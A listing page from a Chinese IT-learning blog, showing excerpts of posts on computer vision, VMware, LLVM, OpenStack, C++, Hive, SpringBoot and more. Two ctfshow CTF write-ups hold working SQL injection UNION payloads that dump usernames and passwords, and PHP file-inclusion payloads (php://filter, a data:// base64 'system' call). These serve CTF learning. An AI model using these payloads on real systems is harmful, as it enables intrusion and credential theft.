<!DOCTYPE html>
<html class="no-js" lang="en">
<head>
	<meta name="generator" content="Hugo 0.121.1">
	<meta charset="UTF-8">
	<meta name="viewport" content="width=device-width, initial-scale=1">
	<title>IT学习者博客</title>
	<script>(function(d,e){d[e]=d[e].replace("no-js","js");})(document.documentElement,"className");</script>
	<meta name="description" content="IT学习者博客">
		<meta property="og:title" content="IT学习者博客" />
<meta property="og:description" content="IT学习者博客" />
<meta property="og:type" content="website" />
<meta property="og:url" content="https://itnewbiea.github.io/" />


	<link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
	<link rel="dns-prefetch" href="//fonts.googleapis.com">
	<link rel="dns-prefetch" href="//fonts.gstatic.com">
	<link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Open+Sans:400,400i,700">

	<link rel="stylesheet" href="/css/style.css">
	
	<link rel="alternate" type="application/rss+xml" href="/index.xml" title="IT学习者博客">

	<link rel="shortcut icon" href="/favicon.ico">
		
</head>
<body class="body">
	<div class="container container--outer">
		<header class="header">
	<div class="container header__container">
		
	<div class="logo">
		<a class="logo__link" href="/" title="IT学习者博客" rel="home">
			<div class="logo__item logo__text">
					<div class="logo__title">IT学习者博客</div>
					
				</div>
		</a>
	</div>
		<div class="divider"></div>
	</div>
</header>
		<div class="wrapper flex">
			<div class="primary">
			
<main class="main list" role="main">
	<article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/3b69fab9fc5e9c0234b48cfe390341b8/" rel="bookmark">
			ICCV 2021 Workshop 盘点
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		自动驾驶视觉
2nd Autonomous Vehicle Vision (AVVision) Workshop Rui Fan, Nemanja Djuric, Rowan McAllister, Ioannis Pitas http://avvision.xyz/iccv21
条件改变的长程视觉定位
4th Workshop on Long-Term Visual Localization under Changing Conditions Vasileios Balntas,Torsten Sattler, Tommaso Cavallari, Stuart Golodetz, Lars Hammarstrand, Huub Heijnen, Martin Humenberger, Fredrik Kahl, Maddern Will, Krystian Mikolajczyk, Tomas Pajdla, Marc Pollefeys, Johannes L Schönberger, Pablo Speciale, Josef Sivic, Carl Toft, Federico Tombari, Johanna Wald, Yubin Kuang https://sites.google.com/view/ltvl2021/
AR/VR中的计算机视觉
Fifth Workshop on Computer Vision for AR/VR Fernando De la Torre, Harald Haraldsson, Matt Uyttendaele, Sofien Bouaziz, Serge Belongie, Andrew Rabinovich https://xr.
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/3b69fab9fc5e9c0234b48cfe390341b8/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/429d4a01e06c43ce92a04f44182a7dbd/" rel="bookmark">
			安装VMware时,出现 安装程序无法继续 Microsoft Runtime DLL 安装程序未能完成安装 您无权输入许可证密钥,请使用系统管理员账户重试 VMware15.5.x 安装问题处理
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		VMware15.5.1安装问题解决办法 说明：
在安装VMware15.5.1时遇到两个问题，第一个是安装时出现：
“安装VMware时,出现 安装程序无法继续 Microsoft Runtime DLL 安装程序未能完成安装”， 解决这个问题后，在打开软件输入license时提示：“您无权输入许可证密钥,请使用系统管理员账户重试”。在网上搜索后并按操作执行，完成了vmware的安装。现整理成文档以备不时之需。
解决方法 ：
（1）出现下面提示框后，先不要点“确定”
（2）“win+r” 打开运行， 输入“%temp%”，打开vmware预安装文件夹路径
（3）打开这个文件，运行“VMareWorkstation.msi”安装VMware
当安装完成后，双击VMare快捷图标，弹出输入秘钥的提示框，输入秘钥后，确认后提示 “vmware您无权输入许可证密钥,请请使用系统管理员账户重试”
（4）
打开VMware安装路径下的x64文件夹，然后复制路径，例如F:\Program Files (x86)\VMware\VMware Workstation\x64；
（5）在搜索里输入“命令提示行”
然后用管理员身份打开，在cd命令到第(4)步复制的路径下， cd F:\Program Files (x86)\VMware\VMware Workstation\x64 再执行下面的指令
vmware-vmx.exe --new-sn xxxx-xxxx-xxxx-xxxx（加粗部分为密钥内容）
到这，就可以成功的运行vmware了。
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/109d09f5f1657c93cc97089eff4b64b1/" rel="bookmark">
			LLVM学习笔记③
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		调用约定：
LLVM functions, calls 和 invokes 都可以为调用指定一个可选的调用约定。每一对caller/callee（调用者/被调用者）的调用约定必须匹配，不然这个程序的行为是未定义的。
LLVM支持以下调用约定，以后可能会添加更多:
“ccc” - The C calling convention
这个调用约定(如果没有指定其他调用约定，则默认为此调用约定)与目标C的调用约定相匹配。这种调用约定支持可变长参数函数调用，并允许在函数声明的原型和实现的声明中存在一些不匹配(与普通C语言一样)。
“fastcc” - The fast calling convention
这个调用约定试图使调用尽可能的快速（如，通过寄存器传递数据）。这个调用约定允许目标使用任何它想要并且能够使用的技巧来为其产生快速的代码，而不要求符合外部指定的ABI (Application Binary Interface). 尾部调用只能在 tailcc、 GHC 或者 HiPE 约定被使用的时候优化。这种调用约定不支持变长参数切要求所有被调用者的原型与函数定义的原型相匹配。
”coldcc” - The cold calling convention
这种调用约定试图在调用不经常执行的假设下，使调用者中的代码尽可能高效。因此，这些调用通常会保留所有寄存器，这样调用就不会破坏调用方的任何活动范围。这种调用约定不支持可变参数，并要求所有调用的原型与函数定义的原型完全匹配。此外，内联器不考虑这样的函数调用。
“cc 10” - GHC convention
这个调用约定已经被格拉斯哥Haskell编译器(GHC)专门实现了。它传递寄存器中的所有信息，通过禁用calllee save寄存器来达到这个目的。这种调用约定不应被轻易使用，而应仅用于特定的情况，例如实现函数式编程语言时经常使用的寄存器固定性能技术的替代方法。目前只有X86支持这个约定，它有以下限制:
①在X86-32下只支持长度大于4bit的类型的形参，不支持浮点型；
②在X86-64下只支持长度大于10bit的类型形参且只支持 （6 floating point parameters）
这个调用约定支持尾部调用优化，但要求调用方和被调用方都在使用它。
”cc 11” - The HiPE calling convention
这个调用约定是专门为高性能Erlang (HiPE)编译器而实现的，高性能Erlang (HiPE)编译器是爱立信开源Erlang/OTP系统的本机代码编译器。它比普通的C调用约定使用更多的寄存器来传递参数，并且没有定义被调用者保存的寄存器。调用约定正确地支持尾部调用优化，但要求调用方和被调用方都使用它。它使用一种寄存器固定机制，类似于GHC的约定，用于将频繁访问的运行时组件固定到特定的硬件寄存器。目前只有X86支持此约定(32位和64位)。
“webkit_jscc” - WebKit’s JavaScript calling convention
这个调用约定已经在WebKit FTL JIT中实现。它在堆栈上从右到左传递参数(就像cdecl做的那样)，并在平台的习惯返回寄存器中返回一个值。
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/109d09f5f1657c93cc97089eff4b64b1/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/d7dd3dec28e6618825510699ce50c4c2/" rel="bookmark">
			ctfshow sql注入漏洞 171-179
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		web171
题目已经给出了拼接的语句是带有单引号的所以我们要闭合并且利用-- 注释掉后面的单引号
1' order by 3-- A 首先查询字段有多少，我试了2,3,4，到4的时候端口异常所以判断为三个字段
-1' union select 1,2,3--+ 查看当前哪些数据可以回显
-1' union select 1,2,database()--+ 查看当前的数据库
-1' union select 1,2,table_name from information_schema.tables where table_schema='ctfshow_web'--+ -1' union select 1,2,group_concat(table_name) from information_schema.tables where table_schema='ctfshow_web'--+ 查ctfshow_web的表
-1' union select 1,2,column_name from information_schema.columns where table_name='ctfshow_user'--+ -1' union select 1,2,column_name from information_schema.columns where table_name='ctfshow_user' --+ 查询列信息
-1' union select 1,password,username from ctfshow_user where username='flag' --+ 拿到flag
web172
1` order by 2 --+ 发现只有两个回显。
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/d7dd3dec28e6618825510699ce50c4c2/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/28597740c033bb4c0cf8a9f386396d0c/" rel="bookmark">
			openstack部署过程5
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		目录 Neutron服务安装【控制节点】1、创库授权2、创建用户,关联角色3、创建Neutron服务并注册API4、安装并配置Neutron安装相关软件包配置neutron组件配置ML2组件配置LinuxBridge配置L3配置DHCP配置元数据代理为Nova配置网络服务 5、同步数据库Neutron服务安装【计算节点】1、安装软件2、修改计算节点neutron配置文件配置neutron组件配置LinuxBridge配置nova.conf启动 验证错误记录 Neutron服务安装【控制节点】 1、创库授权 连接数据库
mysql -u root -p
创建neutron数据库
CREATE DATABASE neutron;
授予数据库权限，然后退出
GRANT ALL PRIVILEGES ON neutron.* TO 'neutron'@'localhost' \ IDENTIFIED BY 'NEUTRON_DBPASS'; GRANT ALL PRIVILEGES ON neutron.* TO 'neutron'@'%' \ IDENTIFIED BY 'NEUTRON_DBPASS'; exit; 2、创建用户,关联角色 # 创建neutron用户并设置密码 openstack user create --domain default --password NEUTRON_PASS neutron # 使用admin角色将neutron用户添加到服务项目中 openstack role add --project service --user neutron admin 3、创建Neutron服务并注册API openstack service create --name neutron \ --description "OpenStack Networking"
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/28597740c033bb4c0cf8a9f386396d0c/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/41a94bb90bd8ddb77f840ac3cc87a3fa/" rel="bookmark">
			swin transformer 总结
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		1. 背景介绍 原名：Swin Transformer: Hierarchical Vision Transformer using Shifted Windows
获奖：2021 ICCV Best Paper
2.文章介绍 2.1概括 Swin Transformer 是一种新型的transformer，可以用作视觉和语言处理的统一模型
特性
- 引出了一种具有层级的特征表达方式（基于self-attentation的shifted window）
- 具有线性的计算复杂度（和输入的图像尺寸相关）性能（state of the art）
- COCO目标检测
- ADE20K语义分割 2.2 创新点介绍 NLP和CV的不同点：
（1）CV包含不同的尺度，而NLP 把tokens作为transformer的基本元素。当前的cv中的transformer都是固定尺度的，不适合用作CV的任务。
（2）CV处理的是高分辨率的图像，而NLP处理的是位于文本段落中的单词。
2.2.1 层级特征图 （a）Swin Transform 创建的是具有层级的特征图，通过合并深层的图像的patches，并且具有线性的计算复杂度（因为仅对每一个局部的window做self-attentation计算）。其中，windows之间是不重叠的，每个window中的patches的个数是固定的。
patch：灰色框的区域。每个patch都会当作一个“token”
local window：红色框的区域
（b) ViT 产生的是一个低分辨率的特征图，并且具有平方的计算复杂度（由于对输入图像尺寸做self-attentation）。
2.2.2 shifted window的提出 shifted window是跨接上一层的windows，提升了模型的性能。在同一个window中的query patches共享相同的key集合，这样提升了访问内存的效率。想反，之前的slide window的方式的self-attentation访问内存比较低效，因为不同的query 像素点有着不同的key集合。
Figure2中，左侧l（L的小写）层是平均分的local window，而l + 1层将windows的形状调整（shifted），有着新的分配方式的windows。在这些新的windows中，self-attentation将会跨越上一层（l层）的windows边界，使得这些windows之间有了连接。
2.2.3 Swin-Tiny的结构 2.3.3.1Swin-Tiny的整体结构 Figure3 (a) Swin-Tiny的结构
输入：是RGB图（维度HW3）。
Patch Partition：通过一个patch切分模块对输入图进行切分成一个没有重叠的patches。每个patch当作一个“token”，它的特征是原始RGB值的一个concatenation.
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/41a94bb90bd8ddb77f840ac3cc87a3fa/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/b96a9f0338e4cca6cf84c3d2f650af6c/" rel="bookmark">
			JMeter压测工具配置与使用（windows10）
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		 JMeter压测工具配置与使用（windows10） JMeter官网下载地址 操作步骤： 1、配置JAVA环境，如果未安装请自行百度，jdk1.8（Java8） 2、下载zip压缩包，本次版本为“apache-jmeter-5.4.1.zip” 3、进入解压目录的bin文件下，点击jmeter.bat，则可以启动JMeter工具了 4、添加线程组 5、添加“聚合报告” 6、添加“查看结果树” 7、添加Http请求、设置请求参数 8、执行压测 9、查看报告 9、常数吞吐量定时器 
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/817b74683e07e59c1acf050cc3d8c55e/" rel="bookmark">
			【易语言】组件复制的调用和事件响应使用方法
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		在各类编程语言中，组件的复制很常见。在易语言中，偶尔也会遇到组件复制并使用组件的情况，很多初学者不知道如何对复制的组件如何使用。本篇使用自带系统核心支持库实现组件复制后的调用和事件响应。
首先，建一个窗口，建一个按钮组件
然后在窗口创建事件中输入核心代码：
复制窗口组件 (原始按钮, 按钮变量)
进行窗口组件按钮的复制。
再然后，在按钮事件中输入代码：
按钮变量 ＝ 取事件组件 ()
按钮变量.发送信息 (274, 61449, 0)
即可实现按钮组件的事件的响应。
详细代码可以 查阅本人上传的资源，【易语言】组件复制的调用和事件响应使用方法【源代码】组件复制拖曳。
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/cada7b56f11cb914b7cb2ed850d7c81e/" rel="bookmark">
			Python OpenCV使用带背景减法的 Haar 级联分类器的车辆和行人实时检测和分类
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		所提出系统的检测阶段主要是在输入图像上移动目标大小的窗口，并为图像的每个子部分计算类 Haar 特征。然后将此差异与将非对象与对象分开的学习阈值进行比较。
这种方法的最大优点是计算速度。由于使用 积分图像可以快速有效地生成网格的矩形子集中的值的总和，因此可以在恒定时间内计算出任何大小的类 Haar 特征（对于 2 个矩形特征大约需要 60 条微处理器指令） ）。
图 1 显示了一个示例视频的单帧。该图像包含行人作为对象。图 2 是使用 MOG2 背景减法后的输出快照。行人下方的灰色部分代表人的影子。
图 1 视频样本帧
作为提高性能的预处理步骤，在 OpenCV 库函数的帮助下使用 MOG2 执行背景减法。用于行人检测的 MOG2 减法结果如图 2 所示。
图 2 背景扣除后的结果
接下来，我们创建要检测的各种对象（目标对象）的 XML 文件，即公共汽车、汽车、双轮车和行人各有一个 XML 文件。参与创建的步骤
XML文件如下所示
涉及的各种过程的流程图
为了实现上述步骤，我们使用了一种称为 Haar 训练工具的特殊工具。该工具由用于创建 XML 文件的各种文件和文件夹组成，如下图所示。
第 1 步：正负图像集的收集 对于正图像数据集，一些图像是从视频中手动裁剪出来的，其余图像是从互联网上下载的。负片图像通过 ImageNet 下载并进行灰度处理，因为与彩色图像相比，这些图像的处理速度和性能既高又简单。然后将所有负图像放置在名为负的文件夹中，然后将所有正图像放置在训练工具文件夹的正文件夹中名为 rawdata 的文件夹中。
公共汽车、汽车、行人和两轮车的正面形象
放置在负片文件夹中的灰度负片图像
正图像是包含目标对象的图像，负图像是没有目标对象的图像。
第 2 步：创建 info.txt、bg.txt 和 Vector 文件
在这一步中，我们转到否定文件夹并单击批处理文件-create_list.bat。这反过来会创建一个文件 bg.txt，其中包含如下所示的负面图像的名称列表
接下来，我们创建 info.txt 文件，该文件告诉我们正图像中对象的确切位置、对象的数量、其 x 坐标、y 坐标等。为此，我们使用一个工具
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/cada7b56f11cb914b7cb2ed850d7c81e/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/b524788c1d57345637c1e9e0424f7731/" rel="bookmark">
			iframe监听页面是否加载完成
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		 &lt;iframe id="aaa" src=" http://www.baidu.com"&gt;&lt;/iframe&gt; &lt;script type="text/javascript"&gt; var a = document.getElementById('aaa'); var iframeLoad = function(){ alert('IFRAME加载完成了!!'); } if(!a.addEventListener){ a.attachEvent('onload', iframeLoad) } a.addEventListener('load', iframeLoad, true); &lt;/script&gt; 
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/c2978ee03985456aa5b71e2a6d132c0b/" rel="bookmark">
			paddle模型cpu部署，压缩，量化
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		NAS介绍 神经结构搜索（Neural Architecture Search，简称NAS）
NAS的原理是给定一个称为搜索空间的候选神经网络结构集合，用某种策略从中搜索出最优网络结构。神经网络结构的优劣即性能用某些指标如精度、速度来度量，称为性能评估。这一过程如下图所示。
NAS 参数重要性定义 首先对预训练模型的参数和head根据其重要性进行重排序，把重要的参数和head排在参数的前侧，保证训练过程中的参数裁剪不会裁剪掉这些重要的参数。参数的重要性计算是先使用dev数据计算一遍每个参数的梯度，然后根据梯度和参数的整体大小来计算当前参数的重要性，head的的重要性计算是通过传入一个全1的对head的mask，并计算这个mask的梯度，根据mask的梯度来判断每个Multi-Head Attention层中每个Head的重要性。
两种蒸馏压缩方式差异 由BERT到Bi-LSTM的知识蒸馏和使用DynaBERT中的策略对BERT进行压缩本质上的原理是一样的，只不过第一种方式蒸馏到的学生模型的结构是已知固定提取定义好的，第二种方式是通过不断的搜索比对得出的。
量化部署 量化
一般而言，神经网络模型的参数都是用的32bit长度的浮点型数表示。实际上，有时不需要保留那么高的精度，可以通过量化的方法减少模型的存储空间，通常用INT8代替Float32存储。比如，SGD（Stochastic Gradient Descent）所需要的精度仅为6~8bit，因此合理的量化网络也可保证精度的情况下减小模型的存储体积，并且能够大幅度加速，使得神经网络在CPU上的运行成为可能。通常，量化包含多种方法，例如：二值神经网络、三元权重网络以及XNOR网络。
要求 5 Paddle Inference 部署量化模型
检查机器
大家可以通过在命令行红输入lscpu查看本机支持指令。
在支持avx512_vnni的CPU服务器上，如：Casecade Lake, Model name: Intel® Xeon® Gold X2XX，INT8精度和性能最高，INT8性能提升为FP32模型的3~3.7倍。
在支持avx512但是不支持avx512_vnni的CPU服务器上，如：SkyLake, Model name：Intel® Xeon® Gold X1XX，INT8性能为FP32性能的1.5倍左右。
请确保机器支持完整的avx512指令集。
步骤 X86 CPU部署量化模型的步骤：
产出量化模型：使用PaddleSlim训练并产出量化模型，用户可以使用PaddleSlim产出量化训练模型或者离线量化模型。
转换量化模型：将量化模型转换成最终部署的量化模型
部署量化模型：使用Paddle Inference预测库部署量化模型
流程步骤如下：
产出量化模型：使用PaddleSlim训练并产出量化模型。注意模型中被量化的算子的参数值应该在INT8范围内，但是类型仍为float型。
在CPU上转换量化模型：在CPU上使用DNNL库转化量化模型为INT8模型。
在CPU上部署预测：在CPU上部署样例并进行预测。
参考X86 Linux上预测部署示例和X86 Windows上预测部署示例，准备预测库，对模型进行部署。
请注意，在X86 CPU预测端部署量化模型，必须开启MKLDNN，不要开启IrOptim。
if args.model_dir == "": config = Config(args.model_file, args.params_file) else: config = Config(args.model_dir) config.enable_mkldnn() config.set_cpu_math_library_num_threads(args.threads) config.switch_ir_optim(False) config.
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/c2978ee03985456aa5b71e2a6d132c0b/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/1a5b16b9f7caa2edb4768498ff9d5fcf/" rel="bookmark">
			C&#43;&#43; STL vector遍历方式及其效率分析
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		C++ STL vector遍历方式及其效率分析 ++i和i++区别下标遍历迭代器遍历for_each遍历总结 ++i和i++区别 ++i使用的是i执行完+1后的值可以直接使用，而i++是先使用i然后在对i进行+1这样就需要一个临时变量去进行转储，虽然只是一个简单的操作但是在循环中这一操作就会被循环次数而放大。如果i是一个简单的int型变量在很多编译器里面会优化这种写法，但是如果i是一个迭代器那么循环的性能就会收到影响，具体大小受到循环次数的约束。笔者亲测在QT中部分源码以及输出如下：
std::vector&lt;int&gt; iv; int i; for(i=0;i&lt;10000000;++i) { iv.push_back(i); } QDateTime dateTime = QDateTime::currentDateTime(); qDebug()&lt;&lt;dateTime.toString("yyyy-MM-dd hh:mm:ss.zzz"); auto iter=iv.begin(); for(iter;iter!=iv.end();++iter) { int a = *iter; } dateTime = QDateTime::currentDateTime(); qDebug()&lt;&lt;dateTime.toString("yyyy-MM-dd hh:mm:ss.zzz"); iter=iv.begin(); for(iter;iter!=iv.end();iter++) { int a = *iter; } dateTime = QDateTime::currentDateTime(); qDebug()&lt;&lt;dateTime.toString("yyyy-MM-dd hh:mm:ss.zzz"); 输出： "2021-10-19 11:29:11.488" "2021-10-19 11:29:11.593" "2021-10-19 11:29:11.738" ++iter循环1000万次耗时105毫秒 iter++循环1000万次耗时145毫秒 由上例可以看出++iter和iter++的区别
下标遍历 直接上代码：
std::vector&lt;int&gt; iv; int i; for(i=0;i&lt;10000000;++i) { iv.push_back(i); } int size = iv.
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/1a5b16b9f7caa2edb4768498ff9d5fcf/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/4908f44fea1f431181d141a79e266b16/" rel="bookmark">
			hive自定义函数-基于位置的数据脱敏
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		hive自定义函数-基于位置的数据脱敏 简要代码 简要 该函数，
1.若想自动脱敏，可以仅传入数据即可
2.若想通过自己传入位置脱敏，又不想报错，可以传入数据，开始位置，结束位置即可
3.若想通过自己传入位置脱敏，且不和规数据不脱敏，代码报错，可以基于2，传入false
代码 package com.bigdata.hive.udf; import com.bigdata.hive.Tools.StringTools; import org.apache.hadoop.hive.ql.exec.Description; import org.apache.hadoop.hive.ql.exec.UDF; import java.util.regex.Pattern; /** * 自定义UDF函数 * 功能：判断传入的字符是否为空 * null NULL \t \r\n \n "" " " 全部视为空值 */ @Description( name = "udf_sjtm_place", value = "_FUNC_('hello',1,2,false) - Returns h****llo ", extended = "Example:\n true : Ignore exception ,you can no write\n &gt; SELECT _FUNC_(\'hello\',1,10) FROM dual LIMIT 1;\n return h**** " ) public class UdfSjtmPlace extends UDF { public String evaluate(final String s,int begin ,int end) { if (StringTools.
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/4908f44fea1f431181d141a79e266b16/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/e8084ec4de8c64eabd3169cee9ac27bc/" rel="bookmark">
			2021-10-18
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		今天主要学习了一些前端的东西，初步了解了前端是干什么的，学习了几个标签，发现做前端挺需要耐心的。像下面这个表格，纯HTML写下来，需要不断调试观察，最后得到还不错的样式。
&lt;!DOCTYPE html&gt; &lt;html&gt; &lt;head&gt; &lt;meta charset="utf-8" /&gt; &lt;title&gt;Insert title here&lt;/title&gt; &lt;/head&gt; &lt;body&gt; &lt;table border="3px" width="1000px" align="center" cellspacing="0" bgcolor="aqua"&gt; &lt;tr&gt; &lt;th align="center" colspan="12"&gt;员工请假单&lt;/th&gt; &lt;/tr&gt; &lt;tr&gt; &lt;td colspan="3" align="center"&gt;姓名&lt;/td&gt; &lt;td colspan="3"&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;&lt;/td&gt; &lt;td align="center"&gt;部门&lt;/td&gt; &lt;td colspan="3"&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&lt;/td&gt; &lt;td align="center"&gt;工号&lt;/td&gt; &lt;td colspan="2"&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&lt;/td&gt; &lt;/tr&gt; &lt;tr&gt; &lt;td colspan="3" align="center"&gt;职位&lt;/td&gt; &lt;td colspan="4"&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;&lt;/td&gt; &lt;td colspan="3" align="center"&gt;申请时间&lt;/td&gt; &lt;td colspan="4"&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;&lt;/td&gt; &lt;/tr&gt; &lt;tr&gt; &lt;td colspan="3" align="center"&gt;请假时间（天数）&lt;/td&gt; &lt;td colspan="9" align="center"&gt;从&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;年&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;月&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;日&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;时到&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;年&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;月&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;日&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;时，共&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;天&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;时&lt;/td&gt; &lt;/tr&gt; &lt;tr&gt; &lt;td colspan="3" align="center"&gt;代理人&lt;/td&gt; &lt;td colspan="4"&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&lt;/td&gt; &lt;td colspan="3"&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&lt;/td&gt; &lt;td colspan="4"&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&lt;/td&gt; &lt;/tr&gt; &lt;tr&gt; &lt;td colspan="
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/e8084ec4de8c64eabd3169cee9ac27bc/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/5b0270c09f6b444bd6a0e3cb6c2ad8ea/" rel="bookmark">
			VUE随机颜色
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		 color16(){//十六进制颜色随机 var r = Math.floor(Math.random()*256); var g = Math.floor(Math.random()*256); var b = Math.floor(Math.random()*256); var color = '#'+r.toString(16)+g.toString(16)+b.toString(16); return color; } 
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/b36b341bc7323567ac42dc340a9ffe7f/" rel="bookmark">
			CTFshow web 文件包含
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		web 78
if(isset($_GET['file'])){ $file = $_GET['file']; include($file); }else{ highlight_file(__FILE__); } 文件包含伪协议，没有过滤。
?file=php://filter/read=convert.base64-encode/resource=flag.php 拿到flag的base64编码，直接去解码。
web 79
if(isset($_GET['file'])){ $file = $_GET['file']; $file = str_replace("php", "???", $file); include($file); }else{ highlight_file(__FILE__); } 这里过滤了php，将“php”替换成“???”，这里可以用data协议
?file=data://text/plain;base64,PD9waHAgc3lzdGVtKCdjYXQgZmxhZy5waHAnKTs+ 然后直接查看源代码，拿到flag。
web80-web81
if(isset($_GET['file'])){ $file = $_GET['file']; $file = str_replace("php", "???", $file); $file = str_replace("data", "???", $file); include($file); }else{ highlight_file(__FILE__); } 抓包，进行大小写绕过。
然后直接查看flag
web82-web86
在这里插入代码片 web87
if(isset($_GET['file'])){ $file = $_GET['file']; $content = $_POST['content']; $file = str_replace("php", "???", $file); $file = str_replace("
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/b36b341bc7323567ac42dc340a9ffe7f/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/4cb38042a11fc11dff976af3ed3cc4bc/" rel="bookmark">
			SpringBoot 多数据源配置笔记
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		大概思路：
创建两个数据源配置类 &gt;&gt;&gt; yml配置中对应配置两个数据源 &gt;&gt;&gt; mapper目录下创建两个目录区分连接的数据源。
1、在config目录下创建两个数据源配置类：（代码中具体配置参考自己的项目类路径）
配置类1：
package com.xcj.juhe.config; import org.apache.ibatis.session.SqlSessionFactory; import org.mybatis.spring.SqlSessionFactoryBean; import org.mybatis.spring.SqlSessionTemplate; import org.mybatis.spring.annotation.MapperScan; import org.springframework.beans.factory.annotation.Qualifier; import org.springframework.boot.context.properties.ConfigurationProperties; import org.springframework.boot.jdbc.DataSourceBuilder; import org.springframework.context.annotation.Bean; import org.springframework.context.annotation.Configuration; import org.springframework.context.annotation.Primary; import org.springframework.core.io.support.PathMatchingResourcePatternResolver; import org.springframework.jdbc.datasource.DataSourceTransactionManager; import javax.sql.DataSource; /** * @author xcj * @date 2021/10/15 15:46 */ @Configuration @MapperScan(basePackages = 